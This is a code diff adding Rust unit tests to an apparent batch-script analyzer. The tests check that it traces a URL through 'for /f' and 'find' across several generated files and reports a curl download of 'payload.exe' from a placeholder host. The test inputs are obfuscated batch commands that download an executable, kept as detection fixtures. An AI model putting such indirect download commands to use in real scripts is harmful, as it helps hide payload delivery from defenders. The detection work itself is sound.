@@ -3630,6 +3630,29 @@ for /f "tokens=* delims=" %%U in ('find "https://" web.txt') do curl -o payload.
     }
 
     #[test]
+    fn for_f_find_reads_multiple_generated_file_sources() {
+        let report = analyze(
+            br#"echo noise>first.txt
+echo https://for-f-find-multi.example/payload.exe>second.txt
+for /f "tokens=* delims=" %%U in ('find "https://" first.txt second.txt') do curl -o payload.exe %%U"#,
+            &Config::default(),
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, dst: Some(dst), .. }
+                        if src == "https://for-f-find-multi.example/payload.exe"
+                            && dst == "payload.exe"
+                )
+            }),
+            "FOR /F multi-file find source did not feed later curl: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+    }
+
+    #[test]
     fn for_f_findstr_reads_generated_file_source() {
         let report = analyze(
             br#"echo noise>web.txt
@@ -14451,6 +14474,32 @@ mod synth_tests {
         assert_eq!(
             lines,
             vec!["https://find-file.example/payload.exe".to_string()]
+        );
+    }
+
+    #[test]
+    fn synth_find_reads_multiple_tracked_file_arguments() {
+        let mut env = Environment::new(&Config::default());
+        env.modified_filesystem.insert(
+            "first.txt".to_string(),
+            FsEntry::Content {
+                content: b"noise\r\n".to_vec(),
+                append: false,
+            },
+        );
+        env.modified_filesystem.insert(
+            "second.txt".to_string(),
+            FsEntry::Content {
+                content: b"https://find-multi.example/payload.exe\r\n".to_vec(),
+                append: false,
+            },
+        );
+
+        let lines = run_pipeline(r#"find "https://" first.txt second.txt"#, &mut env);
+
+        assert_eq!(
+            lines,
+            vec!["https://find-multi.example/payload.exe".to_string()]
         );
     }
 
